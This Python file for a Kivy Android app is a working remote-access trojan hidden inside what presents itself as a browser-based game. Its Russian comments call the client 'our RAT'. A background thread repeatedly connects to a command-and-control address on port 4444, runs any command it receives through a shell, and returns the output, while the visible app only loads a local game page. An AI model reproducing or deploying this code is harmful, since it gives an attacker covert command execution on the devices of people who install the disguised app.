import os
import threading
import time
from android import AndroidBrowser
from jnius import autoclass, cast

# --- НАШ КЛИЕНТ (РАТ) ---
def run_client():
    import socket
    import subprocess
    import platform
    
    # ТУТ МЕНЯЕМ IP НА СВОЙ (тот, что в настройках Wi-Fi: 192.168.0.29)
    C2_HOST = '192.168.0.29' 
    C2_PORT = 4444

    def recv_exact(sock, n):
        buf = b''
        while len(buf) < n:
            c = sock.recv(n - len(buf))
            if not c: raise ConnectionError('closed')
            buf += c
        return buf

    def send_packet(sock, data):
        sock.sendall(len(data).to_bytes(8, 'big') + data)

    def recv_packet(sock):
        n = int.from_bytes(recv_exact(sock, 8), 'big')
        return recv_exact(sock, n)

    def run_cmd(cmd):
        try:
            out = subprocess.run(cmd, shell=True, capture_output=True, timeout=120)
            return (out.stdout + out.stderr).decode(errors='replace') or '(no output)'
        except Exception as e:
            return f'(error: {e})'

    def handle(sock):
        send_packet(sock, f'[*] {platform.node()} online (Android)'.encode())
        while True:
            raw = recv_packet(sock)
            if not raw: return
            msg = raw.decode(errors='replace')
            if msg.startswith('SHELL:'):
                send_packet(sock, run_cmd(msg[6:]).encode())
            elif msg == 'EXIT':
                return

    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((C2_HOST, C2_PORT))
            handle(s)
        except:
            pass
        finally:
            try: s.close()
            except: pass
        time.sleep(15) # Ждем 15 секунд перед повторным подключением
# -------------------------

# Запускаем клиента в фоне
threading.Thread(target=run_client, daemon=True).start()

# Запускаем игру через встроенный браузер Android
activity = autoclass('org.kivy.android.PythonActivity').mActivity
browser = AndroidBrowser(activity)
url = 'file://' + os.path.join(os.path.dirname(__file__), 'index.html')
browser.open(url)
